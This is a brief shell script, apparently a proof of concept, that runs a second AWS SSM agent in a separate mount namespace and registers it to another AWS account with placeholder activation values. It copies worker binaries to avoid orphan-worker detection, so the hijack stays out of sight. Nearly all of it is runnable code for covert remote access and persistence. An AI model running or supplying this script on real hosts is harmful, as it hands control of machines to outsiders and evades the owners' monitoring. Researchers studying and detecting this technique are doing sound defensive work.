sudo su

mkdir /tmp/ssm_pg # A workdir where we place files we need
cd /tmp/ssm_pg
mkdir -p binds/varlib # A folder which will override /var/lib/amazon/ssm/ in the new namespace
mkdir -p binds/logs # A folder which will override /var/log/amazon/ssm in the new namespace
mkdir -p binds/conf # A folder which will override /etc/amazon/ssm in the new namespace

cp -r /etc/amazon/ssm/* ./binds/conf/

# Copy some binaries to avoid orphan worker detection, which causes current execution to fail
cp `which ssm-agent-worker` .
cp `which ssm-session-worker` .

cp ./binds/conf/seelog.xml.template ./binds/conf/seelog.xml

# unshare time - create a new user namespace, make ourselves root in it, and a new filesystem namespace
unshare -m

mount --bind /tmp/ssm_pg/binds/varlib /var/lib/amazon/ssm # Bind over the existing VM
mount --bind /tmp/ssm_pg/binds/logs /var/log/amazon/ssm # Bind over log directory
mount --bind /tmp/ssm_pg/binds/conf /etc/amazon/ssm # Bind over configuration directory

# Register for the new account
export ACC_CODE="<ACTIVATION_CODE>"
export ACC_ID="<ACTIVATION_ID>"
export ACC_REGION="<REGION>"
amazon-ssm-agent -register -code "$ACC_CODE" -id "$ACC_ID" -region "$ACC_REGION"

# Launch ssm manager
amazon-ssm-agent &


